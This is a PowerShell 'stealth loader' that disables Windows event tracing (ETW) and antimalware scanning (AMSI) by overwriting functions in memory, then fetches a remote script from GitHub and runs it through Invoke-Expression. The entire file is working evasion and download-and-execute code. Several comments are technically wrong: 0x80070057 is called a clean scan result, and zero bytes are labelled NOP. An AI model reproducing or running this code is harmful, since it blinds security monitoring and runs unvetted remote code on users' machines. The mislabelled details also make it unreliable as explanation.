# ========== ETW PATCHING FUNCTION ==========
function Patch-ETW {
    try {
        Write-Host "[*] Applying ETW patch..." -ForegroundColor Gray
        
        # Define Win32 APIs for memory patching
        $Method = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtTraceEvent(uint handle, uint flags, uint size, void* ptr);
}
"@
        
        $Kernel32 = Add-Type -MemberDefinition $Method -Name 'Win32' -Namespace 'Win32' -PassThru
        
        # Get EtwEventWrite function address
        $ntdll = $Kernel32::GetModuleHandle("ntdll.dll")
        $etwEventWrite = $Kernel32::GetProcAddress($ntdll, "EtwEventWrite")
        
        if ($etwEventWrite -ne [IntPtr]::Zero) {
            $oldProtect = 0
            
            # Change memory protection to allow writing
            if ($Kernel32::VirtualProtect($etwEventWrite, 4, 0x40, [ref]$oldProtect)) {
                # Save original bytes
                $originalBytes = @()
                for ($i = 0; $i -lt 4; $i++) {
                    $originalBytes += [System.Runtime.InteropServices.Marshal]::ReadByte($etwEventWrite, $i)
                }
                
                # Patch with RET instruction (0xC3) to disable ETW
                [System.Runtime.InteropServices.Marshal]::WriteByte($etwEventWrite, 0, 0xC3)  # RET
                [System.Runtime.InteropServices.Marshal]::WriteByte($etwEventWrite, 1, 0x00)  # NOP
                [System.Runtime.InteropServices.Marshal]::WriteByte($etwEventWrite, 2, 0x00)  # NOP
                [System.Runtime.InteropServices.Marshal]::WriteByte($etwEventWrite, 3, 0x00)  # NOP
                
                # Restore original protection
                $Kernel32::VirtualProtect($etwEventWrite, 4, $oldProtect, [ref]$oldProtect) | Out-Null
                
                Write-Host "[+] ETW patched successfully" -ForegroundColor Green
                Write-Host "[+] Event Viewer logging disabled" -ForegroundColor Green
                return $originalBytes
            }
        }
        Write-Host "[-] ETW patch failed" -ForegroundColor Red
        return @()
    } catch {
        Write-Host "[-] ETW patch error: $_" -ForegroundColor Red
        return @()
    }
}

# ========== AMSI BYPASS FUNCTION ==========
function Patch-AMSI {
    try {
        Write-Host "[*] Applying AMSI bypass..." -ForegroundColor Gray
        
        $Kernel32 = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll")]
public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name 'Kernel32' -Namespace 'Win32' -PassThru
        
        $amsi = $Kernel32::GetModuleHandle("amsi.dll")
        if ($amsi -eq [IntPtr]::Zero) {
            $amsi = $Kernel32::GetModuleHandle("C:\Windows\System32\amsi.dll")
        }
        
        $amsiScanBuffer = $Kernel32::GetProcAddress($amsi, "AmsiScanBuffer")
        
        if ($amsiScanBuffer -ne [IntPtr]::Zero) {
            $oldProtect = 0
            if ($Kernel32::VirtualProtect($amsiScanBuffer, 8, 0x40, [ref]$oldProtect)) {
                # Save original bytes
                $originalBytes = @()
                for ($i = 0; $i -lt 8; $i++) {
                    $originalBytes += [System.Runtime.InteropServices.Marshal]::ReadByte($amsiScanBuffer, $i)
                }
                
                # Patch AMSI to always return AMSI_RESULT_CLEAN (0x80070057)
                [System.Runtime.InteropServices.Marshal]::WriteByte($amsiScanBuffer, 0, 0xB8)  # MOV EAX
                [System.Runtime.InteropServices.Marshal]::WriteByte($amsiScanBuffer, 1, 0x57)  # 0x57
                [System.Runtime.InteropServices.Marshal]::WriteByte($amsiScanBuffer, 2, 0x00)  # 0x00
                [System.Runtime.InteropServices.Marshal]::WriteByte($amsiScanBuffer, 3, 0x07)  # 0x07
                [System.Runtime.InteropServices.Marshal]::WriteByte($amsiScanBuffer, 4, 0x80)  # 0x80
                [System.Runtime.InteropServices.Marshal]::WriteByte($amsiScanBuffer, 5, 0xC3)  # RET
                [System.Runtime.InteropServices.Marshal]::WriteByte($amsiScanBuffer, 6, 0x00)  # NOP
                [System.Runtime.InteropServices.Marshal]::WriteByte($amsiScanBuffer, 7, 0x00)  # NOP
                
                $Kernel32::VirtualProtect($amsiScanBuffer, 8, $oldProtect, [ref]$oldProtect) | Out-Null
                Write-Host "[+] AMSI bypassed" -ForegroundColor Green
                return $originalBytes
            }
        }
        Write-Host "[-] AMSI bypass failed" -ForegroundColor Red
        return @()
    } catch {
        Write-Host "[-] AMSI bypass error" -ForegroundColor Red
        return @()
    }
}

# ========== MAIN EXECUTION ==========
try {
    # Clear console and set title
    Clear-Host
    $host.UI.RawUI.WindowTitle = "Lilith Clicker - Stealth Loader"
    
    Write-Host "=========================================" -ForegroundColor Cyan
    Write-Host "    LILITH CLICKER - STEALTH EDITION     " -ForegroundColor Cyan
    Write-Host "=========================================" -ForegroundColor Cyan
    Write-Host ""
    
    # Apply ETW patch (prevents Event Viewer logging)
    $etwOriginalBytes = Patch-ETW
    
    # Apply AMSI bypass (prevents script scanning)
    $amsiOriginalBytes = Patch-AMSI
    
    Write-Host ""
    Write-Host "[*] Downloading LilithClicker from GitHub..." -ForegroundColor Gray
    
    # Download and execute LilithClicker
    $url = "https://raw.githubusercontent.com/praiselily/AutoClicker/main/LilithClicker.ps1"
    
    # Method 1: Direct execution
    try {
        Invoke-Expression (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
    } catch {
        # Method 2: Alternative download method
        Write-Host "[*] Trying alternative download method..." -ForegroundColor Yellow
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
        $scriptContent = $webClient.DownloadString($url)
        $webClient.Dispose()
        
        Invoke-Expression $scriptContent
    }
    
    Write-Host ""
    Write-Host "[+] LilithClicker loaded successfully!" -ForegroundColor Green
    Write-Host "[!] ETW patched - No Event Viewer logs" -ForegroundColor Yellow
    Write-Host "[!] AMSI bypassed - Script scanning disabled" -ForegroundColor Yellow
    
} catch {
    Write-Host "[-] Error: $_" -ForegroundColor Red
    Write-Host "[!] Press any key to exit..." -ForegroundColor Gray
    $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Keep console open if running interactively
if ($Host.Name -eq "ConsoleHost") {
    Write-Host ""
    Write-Host "Script completed. Window will close in 5 seconds..." -ForegroundColor Gray
    Start-Sleep -Seconds 5
}
